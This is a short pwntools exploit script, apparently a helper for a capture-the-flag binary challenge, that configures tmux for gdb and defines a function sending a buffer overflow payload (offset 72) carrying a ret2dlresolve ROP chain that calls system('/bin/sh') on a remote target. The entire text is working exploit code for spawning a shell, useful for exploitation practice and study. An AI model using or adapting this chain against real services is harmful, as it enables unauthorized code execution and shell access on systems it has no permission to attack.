# Contains only the things pwninit doesn't do for us automatically

# So gdb.attach() spawns a horizontal split in tmux
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

offset = 72
total = 200

# Copy pasta to pwninit solve.py script
def pwn(r): # r is remote
    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    r.sendline(fit({offset:raw_rop, total:dlresolve.payload}))

